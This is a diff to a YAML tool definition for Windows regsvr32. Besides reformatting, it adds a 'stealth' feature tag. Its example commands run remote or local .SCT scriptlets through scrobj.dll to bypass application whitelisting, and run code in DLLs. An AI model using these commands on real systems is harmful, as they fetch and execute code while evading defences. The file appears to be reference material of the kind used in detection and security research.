@@ -2,7 +2,8 @@
 id: windows-execution-regsvr32
 namespace: windows:execution:regsvr32
 name: regsvr32
-description: 'Used by Windows to register dlls Located at: C:\Windows\System32\regsvr32.exe; C:\Windows\SysWOW64\regsvr32.exe.'
+description: 'Used by Windows to register dlls Located at: C:\Windows\System32\regsvr32.exe;
+  C:\Windows\SysWOW64\regsvr32.exe.'
 author: Oddvar Moe
 version: 1.0.0
 capabilities:
@@ -42,7 +43,10 @@ resource_profile:
 allowed-tools:
 - regsvr32
 parameters: []
-features: []
+features:
+- pipes-stdin
+- pipes-stdout
+- stealth
 execution:
   template: regsvr32
   sandbox: execFile
@@ -50,17 +54,23 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Execute the specified remote .SCT script with scrobj.dll. (Execute code from remote scriptlet, bypass Application whitelisting)
+- description: Execute the specified remote .SCT script with scrobj.dll. (Execute
+    code from remote scriptlet, bypass Application whitelisting)
   command: regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll
-- description: Execute the specified local .SCT script with scrobj.dll. (Execute code from scriptlet, bypass Application whitelisting)
+- description: Execute the specified local .SCT script with scrobj.dll. (Execute code
+    from scriptlet, bypass Application whitelisting)
   command: regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll
-- description: Execute the specified remote .SCT script with scrobj.dll. (Execute code from remote scriptlet, bypass Application whitelisting)
+- description: Execute the specified remote .SCT script with scrobj.dll. (Execute
+    code from remote scriptlet, bypass Application whitelisting)
   command: regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll
-- description: Execute the specified local .SCT script with scrobj.dll. (Execute code from scriptlet, bypass Application whitelisting)
+- description: Execute the specified local .SCT script with scrobj.dll. (Execute code
+    from scriptlet, bypass Application whitelisting)
   command: regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll
-- description: Execute code in a DLL. The code must be inside the exported function `DllRegisterServer`. (Execute DLL file)
+- description: Execute code in a DLL. The code must be inside the exported function
+    `DllRegisterServer`. (Execute DLL file)
   command: regsvr32.exe /s {PATH:.dll}
-- description: Execute code in a DLL. The code must be inside the exported function `DllUnRegisterServer`. (Execute DLL file)
+- description: Execute code in a DLL. The code must be inside the exported function
+    `DllUnRegisterServer`. (Execute DLL file)
   command: regsvr32.exe /u /s {PATH:.dll}
 references:
 - label: ''
@@ -111,7 +121,6 @@ install:
   commands:
   - choco install regsvr32
 ---
-
 
 # regsvr32
 
